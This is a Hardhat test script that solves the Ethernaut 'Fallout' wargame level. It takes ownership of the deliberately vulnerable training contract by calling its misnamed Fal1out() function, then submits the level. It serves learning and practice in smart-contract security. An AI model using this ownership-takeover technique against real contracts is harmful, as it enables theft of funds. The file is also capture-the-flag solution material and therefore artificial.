import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";


let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;


describe("Fallout", function () {

  async function deployTokenFixture(): Promise<any> {
    accounts = await ethers.getSigners();
    [eoa] = accounts;
    const challengeFactory = await ethers.getContractFactory(`Fallout`);
    const challengeAddress = await createChallenge(
      `0x0AA237C34532ED79676BCEa22111eA2D01c3d3e7`
    );
    challenge = await challengeFactory.attach(challengeAddress);

    return { eoa, challenge };
  }

  it("solves the challenge", async function () {
    const { eoa, challenge } = await loadFixture(deployTokenFixture);
    tx = await challenge.Fal1out();
    await tx.wait();

  });

  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});
